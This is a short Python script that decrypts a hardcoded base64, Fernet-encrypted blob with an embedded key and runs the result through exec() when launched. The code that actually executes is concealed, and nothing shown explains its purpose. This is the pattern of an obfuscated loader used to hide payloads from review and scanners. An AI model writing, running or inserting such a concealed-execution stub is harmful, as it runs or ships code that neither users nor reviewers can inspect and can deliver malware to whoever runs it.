from cryptography.fernet import Fernet
import base64

def decrypt_and_execute(encrypted_code_b64, key=b'agh9KfToLruEaAHp5E9QP07PhSYwiGS1Mt_47UhmcDw='):
    f = Fernet(key)
    encrypted_code = base64.b64decode(encrypted_code_b64.encode('utf-8'))
    decrypted_code = f.decrypt(encrypted_code).decode('utf-8')
    exec(decrypted_code)

if __name__ == "__main__": 
    decrypt_and_execute('Z0FBQUFBQnBRUWpjTXlMRkhqYU5SaldFUDFLTGhXNEdOampXWE5LckxIVnl1dVFVV1U1WEdLdEZHcS04d0U5dG5MQlFxNXdoUW5IUWJvbGpabnNRQWk5OUdkNXFvdDRwWElGQVVhWUlSZnF5dTctZEZ5bW56Z2dHSzM5Y3U3Z0FJdy1WbjJ5VFhoaFlzWmxzRUxfQUZtemNSZTBMWVFXWGhqZ21QOVNsNzVkSWdWZHZwSXJua1lPQ09WQlJvVnNMcFpyeFBDdi1Kc1dodWdlRC1XRG5YRVhveFd4MTllTUhWN2VrUnFtSWI2SkNqalJPa3ZYTmJsOHBhTW85aDNESXh2TEc3RkVCSHV6NlV6UUVPMWh0MDducnNkd2xNd0xDZjhYbW1rTmlBRlYtWWxVR085RXJhVGtFcXRKVGNPcHBORHhJWXBqTF9oTWE=')
